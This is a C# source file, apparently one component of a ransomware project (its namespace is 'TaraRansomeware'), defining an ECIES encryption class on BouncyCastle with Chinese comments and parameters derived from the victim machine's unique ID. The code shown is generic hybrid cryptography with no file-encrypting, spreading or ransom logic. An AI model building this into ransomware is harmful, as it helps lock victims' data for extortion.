using Org.BouncyCastle.Crypto.Agreement;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Macs;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Paddings;
using Org.BouncyCastle.Crypto.Parameters;
using System;

namespace TaraRansomeware
{
    internal class EciesCipherEngine
    {
        private IesParameters iesParam = null;

        /// <summary>
        /// 加密引擎构造
        /// </summary>
        /// <param name="guid">用户机器的唯一识别码</param>
        public EciesCipherEngine(byte[] guid)
        {
            int len = guid.Length / 2;

            byte[] d = new byte[len];
            byte[] e = new byte[len];

            Array.Copy(guid, 0, d, 0, len);
            Array.Copy(guid, len, e, 0, len);

            iesParam = new IesWithCipherParameters(d, e, 256, 256);
        }

        /// <summary>
        /// 加密函数
        /// </summary>
        /// <param name="pubKey">椭圆曲线公钥</param>
        /// <param name="privRand">一个随机密钥对的私钥</param>
        /// <param name="message">明文</param>
        /// <returns>密文</returns>
        public byte[] Encrypt(ECPublicKeyParameters pubKey, ECPrivateKeyParameters privRand, byte[] message)
        {
            IesEngine engine = IesEngineFactory();
            engine.Init(true, privRand, pubKey, iesParam);
            return engine.ProcessBlock(message, 0, message.Length);
        }

        /// <summary>
        /// 解密函数
        /// </summary>
        /// <param name="privKey">椭圆曲线私钥</param>
        /// <param name="pubRand">加密所用随机密钥对的公钥</param>
        /// <param name="ciphertext">密文</param>
        /// <returns>明文</returns>
        public byte[] Decrypt(ECPrivateKeyParameters privKey, ECPublicKeyParameters pubRand, byte[] ciphertext)
        {
            IesEngine engine = IesEngineFactory();
            engine.Init(false, privKey, pubRand, iesParam);
            return engine.ProcessBlock(ciphertext, 0, ciphertext.Length);
        }

        /// <summary>
        /// 定义加密所使用的ECIES混合加密体系
        /// </summary>
        /// <returns>IES加密引擎</returns>
        private static IesEngine IesEngineFactory()
        {
            return new IesEngine(
                new ECDHBasicAgreement(),
                new Kdf2BytesGenerator(new Sha256Digest()),
                new HMac(new Sha256Digest()),
                new PaddedBufferedBlockCipher(new CbcBlockCipher(new AesEngine()))
            );
        }
    }
}

